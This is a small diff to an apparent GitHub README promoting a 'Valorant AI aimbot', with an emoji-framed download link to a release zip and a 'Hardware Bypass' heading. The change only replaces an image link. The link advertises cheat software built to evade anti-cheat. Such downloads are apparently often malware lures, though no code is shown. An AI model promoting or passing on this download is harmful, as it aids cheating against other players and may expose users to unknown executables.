@@ -2,7 +2,8 @@
 
 
 ##💎💎💎[DOWNLOAD](https://github.com/curse-dev/Valorant-ai-aimbot/releases/download/aimbot/Valorant.Aimbot.zip)💎💎💎
-!(https://private-user-images.githubusercontent.com/276549013/583893214-abb5679e-53b4-4fa6-b200-bbdb0a491348.jpg?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzcyMjMyOTksIm5iZiI6MTc3NzIyMjk5OSwicGF0aCI6Ii8yNzY1NDkwMTMvNTgzODkzMjE0LWFiYjU2NzllLTUzYjQtNGZhNi1iMjAwLWJiZGIwYTQ5MTM0OC5qcGc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjYwNDI2JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI2MDQyNlQxNzAzMTlaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT04ZGFhNDUwZjFhNmQ5NTI3MWM4YjYwZDUyNjY3ZDFkMDJhNzlkOGJlM2FkMmQ0NmRmMDJhNzliMTkwYmJhN2Y4JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCZyZXNwb25zZS1jb250ZW50LXR5cGU9aW1hZ2UlMkZqcGVnIn0.rHUiHZ_WiJo1huMyhfQxICAApR2WyrpmFpX99Lzspwc)
+<img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/36f141de-338b-446f-b125-747298b4c69a" />
+
 
 
 🖱️ Hardware Bypass
